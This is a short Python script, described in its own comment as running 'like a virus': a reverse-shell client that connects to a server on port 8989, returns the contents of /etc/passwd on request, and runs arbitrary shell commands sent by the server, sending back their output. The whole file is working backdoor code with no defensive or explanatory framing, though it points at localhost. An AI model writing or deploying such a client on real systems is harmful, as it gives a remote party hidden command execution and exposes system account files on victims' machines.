# client side runs like a virus, so when server ask for command it returns (i.e ls)
#!/usr/bin/env python3
import socket
import os

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('localhost', 8989))
while True:
	data = client.recv(1024)
	if data:
		command = data.decode("utf-8")
		if command == "passwd":
			with open('/etc/passwd', 'r') as f:
				client.send(str.encode(f.read()))
		elif "cmd" in command:
			new_command = ' '.join(command.split('cmd ')[1:])
			results = os.popen(new_command).read()
			client.send(str.encode(results))
		elif command == "exit":
			break
		else:
			client.send(str.encode("Invalid Command " + command))
